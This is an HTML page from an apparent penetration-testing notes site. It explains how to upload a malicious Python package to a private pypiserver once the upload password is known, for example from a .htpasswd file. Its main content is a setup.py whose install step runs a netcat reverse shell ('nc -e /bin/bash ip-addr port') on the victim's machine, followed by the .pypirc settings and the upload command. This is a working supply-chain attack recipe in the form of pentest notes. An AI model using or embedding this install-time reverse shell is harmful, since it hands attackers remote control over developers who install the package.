@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+		<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>PyPI Server | Hacking Notes</title>
+<meta name="generator" content="Jekyll v3.8.4" />
+<meta property="og:title" content="PyPI Server" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="PyPI Server (pypiserver) is a minimal PyPi compatible server for pip or easy_install." />
+<meta property="og:description" content="PyPI Server (pypiserver) is a minimal PyPi compatible server for pip or easy_install." />
+<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/software/pypi-server/" />
+<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/software/pypi-server/" />
+<meta property="og:site_name" content="Hacking Notes" />
+<script type="application/ld+json">
+{"description":"PyPI Server (pypiserver) is a minimal PyPi compatible server for pip or easy_install.","url":"http://0.0.0.0:4000/hackingnotes/software/pypi-server/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"PyPI Server","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
+
+		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
+		<link rel="stylesheet" href="/hackingnotes/css/main.css">
+		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
+		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
+		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">
+
+		
+	</head>
+
+	<body>
+		<header>
+			<h1>
+				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
+				Hacking Notes
+				<button type="button" class="open-nav" id="open-nav"></button>
+			</h1>
+
+			<form action="/hackingnotes/search/" method="get">
+				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
+				<input type="submit" value="Search" style="display: none;">
+			</form>
+
+			<nav class="full-navigation">
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/">What is this?</a>
+					</li>
+				</ul>
+
+				<ul>
+					
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/active-directory/ad-attacks/">Active Directory</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/other/hacking-aws/">Other</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/services/ftp/">Services</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level current">
+							
+							<a href="/hackingnotes/software/wordpress/">Software</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
+								
+									<li class="nav-item current"><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/web/file-inclusion/">Web</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
+								
+							</ul>
+						</li>
+					
+				</ul>
+
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/changelog/">Change Log</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<section class="main">
+			<div class="page-header">
+				<h2>Software</h2>
+				<h3>PyPI Server</h3>
+			</div>
+			<article class="content">
+				<p>PyPI Server (pypiserver) is a minimal PyPi compatible server for pip or easy_install.</p>
+
+<h1 id="what-is-a-pypi-server">What is a PyPI Server?</h1>
+
+<p><code class="highlighter-rouge">pypiserver</code> is a minimal <a href="https://pypi.org">PyPI</a> compatible server for <code class="highlighter-rouge">pip</code> or <code class="highlighter-rouge">easy_install</code>. It is based on <a href="http://bottlepy.org">bottle</a> and serves packages from regular directories. Wheels, bdists, eggs and accompanying PGP-signatures can be uploaded either with <code class="highlighter-rouge">pip</code>, <code class="highlighter-rouge">setuptools</code>, <code class="highlighter-rouge">twine</code>, <code class="highlighter-rouge">pypi-uploader</code>, or simply copied with <code class="highlighter-rouge">scp</code>.</p>
+
+<p>PyPI Server helps us to create a <strong>Pirvate Python Package Repository.</strong></p>
+
+<h1 id="what-happens-when-someone-installs-from-that-server-and-we-have-the-password">What happens when someone installs from that server and we have the password?</h1>
+
+<p>On that moment that we notice that someone installs all packages from the <code class="highlighter-rouge">pypiserver</code>, and we have the password, we can <strong>upload our malicious python package</strong>.</p>
+
+<p>We will usually find the password inside the <code class="highlighter-rouge">.htpasswd</code> file from apache or nginx.</p>
+
+<h2 id="create-our-python-package">Create our Python Package</h2>
+
+<p>Firstly, we need to create a directory with the name of the package, in this example I will use <code class="highlighter-rouge">demo_hacking</code>.</p>
+
+<p>Navigate into the newly created directory. And create the following files following the hierarchy:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>demo_hacking
+├── demo_hacking
+│   └── __init__.py
+├── README.md
+├── setup.cfg
+├── setup.py
+└── .pypirc
+</code></pre></div></div>
+
+<p>Edit <code class="highlighter-rouge">setup.py</code> file, in this file we will put our malicious code. At the moment of the installation package our code will execute on victim’s machine. This is an example of reverse shell</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from setuptools import setup
+import os
+os.system("nc -e /bin/bash ip-addr port") #this is the malicious code
+setup(
+    name='demo_hacking',
+    packages=['demo_hacking'],
+    description='Demo H4ck1ng edition',
+    version='0.1',
+    author='mvc1009',
+    keywords=['pip','demo','hacking']
+    )
+</code></pre></div></div>
+
+<p>Add an example function to <code class="highlighter-rouge">__init__.py</code>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def print_demo():
+    print("Demo Hacking")
+</code></pre></div></div>
+
+<p>The <code class="highlighter-rouge">setup.cfg</code> file lets PyPI know the README is a Markdown file:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[metadata]
+description-file = README.md
+</code></pre></div></div>
+
+<p>Create an empty <code class="highlighter-rouge">README.md</code> optionally you can create a <code class="highlighter-rouge">LICENSE.txt</code> file:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>touch REAMDE.md
+touch LICENSE.txt
+</code></pre></div></div>
+
+<p>Finally you need to create the <code class="highlighter-rouge">.pypirc</code> file on the <strong>home</strong> directory:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[distutils]
+index-servers =
+  pypi
+  demo
+[pypi]
+username:
+password:
+[demo]
+repository: http://localhost:port
+username: user
+password: password
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Hint</strong>: Do not forget that you can change the dome directory path: <code class="highlighter-rouge">export HOME=path</code></p>
+</blockquote>
+
+<p>Finally you need to upload de package to the <code class="highlighter-rouge">pypiserver</code>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python setup.py sdist upload -r demo
+</code></pre></div></div>
+
+<h1 id="references">References:</h1>
+
+<ul>
+  <li><a href="https://pypi.org/project/pypiserver/">https://pypi.org/project/pypiserver/</a></li>
+  <li><a href="https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/">https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/</a></li>
+</ul>
+
+			</article>
+		</section>
+
+		<script>
+			document.getElementById("open-nav").addEventListener("click", function () {
+				document.body.classList.toggle("nav-open");
+			});
+		</script>
+	</body>
+</html>
